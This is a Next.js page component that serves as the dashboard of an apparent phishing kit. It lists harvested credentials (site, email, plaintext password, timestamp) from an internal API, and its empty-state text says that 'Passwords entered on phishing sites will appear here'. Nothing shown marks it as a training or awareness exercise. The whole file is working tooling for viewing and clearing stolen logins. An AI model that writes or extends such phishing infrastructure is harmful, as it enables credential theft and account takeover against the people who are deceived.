'use client';

import Link from "next/link";
import { useEffect, useState } from "react";

interface PasswordEntry {
  id: string;
  password: string;
  email: string;
  site: string;
  timestamp: string;
}

// API functions
async function fetchPasswords() {
  try {
    const response = await fetch('/api/passwords');
    const data = await response.json();
    if (data.success) {
      return data.data;
    }
    return [];
  } catch (error) {
    console.error('Failed to fetch passwords:', error);
    return [];
  }
}

async function clearAllPasswords() {
  try {
    const response = await fetch('/api/passwords', {
      method: 'DELETE'
    });
    const data = await response.json();
    return data.success;
  } catch (error) {
    console.error('Failed to clear passwords:', error);
    return false;
  }
}

export default function PasswordsPage() {
  const [passwords, setPasswords] = useState<PasswordEntry[]>([]);
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    // Load passwords from API
    const loadPasswords = async () => {
      const fetchedPasswords = await fetchPasswords();
      setPasswords(fetchedPasswords);
      setIsLoading(false);
    };

    loadPasswords();
  }, []);

  const clearPasswords = async () => {
    const success = await clearAllPasswords();
    if (success) {
      setPasswords([]);
    }
  };

  const formatDate = (timestamp: string) => {
    const date = new Date(timestamp);
    return date.toLocaleString('en-US', {
      year: 'numeric',
      month: 'short',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit'
    });
  };

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
          <p className="text-gray-600">Loading passwords...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <div className="bg-white shadow-sm border-b">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center py-4">
            <div className="flex items-center">
              <Link href="/">
                <button className="mr-4 p-2 text-gray-600 hover:text-gray-900 transition-colors">
                  <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 19l-7-7m0 0l7-7m-7 7h18" />
                  </svg>
                </button>
              </Link>
              <h1 className="text-2xl font-bold text-gray-900">Collected Passwords</h1>
            </div>
            <div className="flex items-center space-x-3">
              <span className="text-sm text-gray-500">
                Total: {passwords.length} passwords
              </span>
              {passwords.length > 0 && (
                <button
                  onClick={clearPasswords}
                  className="bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded-lg text-sm font-medium transition-colors"
                >
                  Clear All
                </button>
              )}
            </div>
          </div>
        </div>
      </div>

      {/* Content */}
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        {passwords.length === 0 ? (
          <div className="text-center py-12">
            <div className="bg-white rounded-lg shadow-sm p-8 max-w-md mx-auto">
              <div className="w-16 h-16 bg-gray-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg className="w-8 h-8 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
              </div>
              <h3 className="text-lg font-medium text-gray-900 mb-2">No passwords collected yet</h3>
              <p className="text-gray-500 mb-4">Passwords entered on phishing sites will appear here.</p>
              <Link href="/">
                <button className="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 rounded-lg font-medium transition-colors">
                  Go Back to Sites
                </button>
              </Link>
            </div>
          </div>
        ) : (
          <div className="grid gap-6 md:grid-cols-2 lg:grid-cols-3">
            {passwords.map((entry) => (
              <div key={entry.id} className="bg-white rounded-lg shadow-sm p-6 border border-gray-200">
                <div className="flex items-center justify-between mb-4">
                  <h3 className="text-lg font-semibold text-gray-900 capitalize">
                    {entry.site}
                  </h3>
                  <span className="text-xs text-gray-500 bg-gray-100 px-2 py-1 rounded">
                    {entry.id}
                  </span>
                </div>

                <div className="space-y-3">
                  <div>
                    <label className="text-sm font-medium text-gray-500">Email</label>
                    <div className="mt-1 p-3 bg-gray-50 rounded-md border">
                      <span className="text-gray-900 text-sm break-all">
                        {entry.email || 'Not provided'}
                      </span>
                    </div>
                  </div>

                  <div>
                    <label className="text-sm font-medium text-gray-500">Password</label>
                    <div className="mt-1 p-3 bg-gray-50 rounded-md border">
                      <code className="text-gray-900 font-mono text-sm break-all">
                        {entry.password}
                      </code>
                    </div>
                  </div>

                  <div>
                    <label className="text-sm font-medium text-gray-500">Timestamp</label>
                    <div className="mt-1 text-sm text-gray-900">
                      {formatDate(entry.timestamp)}
                    </div>
                  </div>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}
